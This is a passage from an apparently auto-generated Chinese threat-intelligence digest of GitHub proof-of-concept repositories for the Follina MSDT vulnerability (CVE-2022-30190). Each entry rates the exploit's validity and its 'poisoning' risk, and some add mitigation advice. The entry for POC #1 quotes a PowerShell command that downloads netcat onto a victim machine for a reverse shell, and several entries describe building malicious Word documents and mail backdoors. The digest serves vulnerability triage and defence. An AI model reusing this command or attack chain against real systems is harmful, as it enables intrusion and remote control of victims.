4.  **远程代码执行:** 当用户打开文档时，Word 会从远程服务器检索 HTML 文件，并执行其中的恶意 JavaScript 代码，从而触发 MSDT 并执行攻击者预设的命令。

**POC代码分析:**

提供的 POC 代码 `main.py` 脚本的功能如下:

*   **创建恶意文档：** 该脚本会修改 Word 文档的 `_rels/document.xml.rels` 文件，插入一个指向攻击者控制的 HTTP 服务器的链接。当用户打开该文档时，Word 会尝试从该链接下载 HTML 文件。
*   **启动 HTTP 服务器：** 该脚本会在指定的端口启动一个 HTTP 服务器，用于托管包含恶意 JavaScript 代码的 HTML 文件。该 HTML 文件使用 `ms-msdt:` 协议执行命令。
*   **启动 Netcat 监听器：** 该脚本会启动一个 Netcat 监听器，等待受害者机器反弹 shell。

**投毒风险分析:**

分析POC代码，发现以下潜在的投毒风险点:

*   **硬编码的下载地址：**  `Invoke-WebRequest https://github.com/CyberTitus/Follina/raw/main/nc64.exe -OutFile C:\Windows\Tasks\nc.exe`  这行代码从GitHub下载 `nc64.exe`  (Netcat) 到受害者机器。攻击者可能替换 CyberTitus 仓库中的 `nc64.exe` 文件，导致受害者下载恶意的 Netcat 版本或其他恶意程序。
*   **命令混淆与执行:** 恶意命令通过base64编码后执行，具有一定的隐藏性。如果攻击者将命令修改为具有破坏性的操作，则会存在较高的安全风险。
*   **Shell反弹地址:**虽然IP由用户输入，但代码逻辑存在被篡改的风险，从而反弹Shell到攻击者指定的地址。

**有效性:**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用的有效性较高。该漏洞在野外被广泛利用，且 POC 代码能够成功触发漏洞并实现远程代码执行。

**项目地址:** [AbdulRKB/Follina](https://github.com/AbdulRKB/Follina)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #2

**来源**: [CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md](../2022/CVE-2022-30190-Arkha-Corvus_LetsDefend-SOC173-Follina-0-Day-Detected.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，权限提升

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 用户打开恶意Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

该漏洞允许攻击者通过特制的Office文档，利用`ms-msdt:`协议调用MSDT执行任意命令。攻击者可以通过嵌入恶意URL到Word文档中，诱导用户点击或者预览，从而触发漏洞。漏洞利用流程如下：

1.  攻击者创建一个包含恶意链接的Word文档。
2.  用户打开该文档。
3.  文档利用`ms-msdt:`协议调用MSDT。
4.  MSDT执行攻击者指定的命令。

根据提供的漏洞利用代码分析，这是一个对 Follina 漏洞的案例研究，通过分析恶意Word文档触发 `msdt.exe` 的执行，从而实现远程代码执行。

**有效性：** 提供的Github仓库包含对漏洞的分析和利用过程，可以有效帮助理解漏洞原理。

**投毒风险：** 该存储库是一个案例分析，主要包含漏洞分析和利用过程的记录，包括文件哈希、网络流量分析和电子邮件分析。代码中没有发现明显的恶意后门代码，投毒的可能性较低（约5%），主要是考虑到作者可能在分析过程中引入了一些未知的或者不安全的操作，但从整体上看，这是一个漏洞分析的记录，投毒的可能性不大。

**利用方式：**

1.  **构造恶意Word文档：** 攻击者构造包含恶意`ms-msdt:` URL的Word文档。
2.  **传播恶意文档：** 攻击者通过钓鱼邮件等方式将恶意文档发送给目标用户。
3.  **触发漏洞：** 用户打开恶意文档，触发MSDT执行恶意代码。
4.  **执行恶意命令：** 攻击者利用MSDT执行任意命令，例如安装恶意软件，窃取数据等。

**建议：**

*   及时安装微软发布的补丁。
*   禁用`ms-msdt:`协议，作为缓解措施。
*   加强用户安全意识培训，避免打开来源不明的文档。
*   使用杀毒软件和入侵检测系统，及时发现和阻止恶意攻击。

**项目地址:** [Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected](https://github.com/Arkha-Corvus/LetsDefend-SOC173-Follina-0-Day-Detected)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #3

**来源**: [CVE-2022-30190-Cosmo121_Follina-Remediation.md](../2022/CVE-2022-30190-Cosmo121_Follina-Remediation.md)

## CVE-2022-30190 - Microsoft MSDT "Follina" 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 见漏洞库信息中的受影响版本列表

**利用条件:** 需要用户打开恶意文档(如Word)或点击恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-30190 (Follina) 是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以利用 Word 等调用应用程序，通过 URL 协议调用 MSDT，从而执行任意代码。利用方式通常是攻击者制作包含恶意代码的 Word 文档，该文档利用 Word 远程模板功能从远程 Web 服务器检索 HTML 文件，该 HTML 文件包含触发 MSDT 漏洞的代码，最终导致命令执行。

根据漏洞库信息，大量Windows版本都受到影响。搜索结果也证实了该漏洞的严重性，并提供了相关的利用和检测信息。提供的代码片段仅仅是GPL协议的License文件，并非POC代码，因此无法根据此代码判断投毒风险,需要验证是否存在后门。

由于提供的代码片段仅仅是GPL协议内容，无法判断实际的POC代码。根据搜索结果和漏洞描述，此漏洞的有效性高，因为在野外已经被利用。

**项目地址:** [Cosmo121/Follina-Remediation](https://github.com/Cosmo121/Follina-Remediation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #4

**来源**: [CVE-2022-30190-DerZiad_CVE-2022-30190.md](../2022/CVE-2022-30190-DerZiad_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开包含恶意代码的文档，例如Word文档

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

